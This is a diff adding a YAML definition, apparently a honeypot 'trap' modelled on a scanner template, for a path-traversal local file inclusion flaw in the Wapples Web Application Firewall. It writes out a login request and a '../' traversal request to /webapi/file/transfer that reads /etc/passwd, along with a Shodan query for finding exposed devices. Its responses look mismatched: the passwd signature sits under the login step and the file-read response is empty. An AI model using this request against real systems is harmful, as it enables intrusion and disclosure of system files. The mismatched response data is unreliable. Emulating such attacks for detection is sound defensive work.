@@ -1,0 +1,40 @@
+id: wapples-firewall-lfi
+info:
+  name: Wapples Web Application Firewall - Local File Inclusion
+  author: For3stCo1d
+  description: Wapples Web Application Firewall is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://medium.com/@_sadshade/wapples-web-application-firewall-multiple-vulnerabilities-35bdee52c8fb
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: http.title:"Intelligent WAPPLES"
+  tags: wapples,firewall,lfi,authenticated
+traps:
+- request:
+    method: POST
+    path: /webapi/auth
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'id={{username}}&password={{password}}
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: root:[x*]:0:0
+- request:
+    method: GET
+    path: /webapi/file/transfer?name=/../../../../../../../../etc/passwd&type=db_backup
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
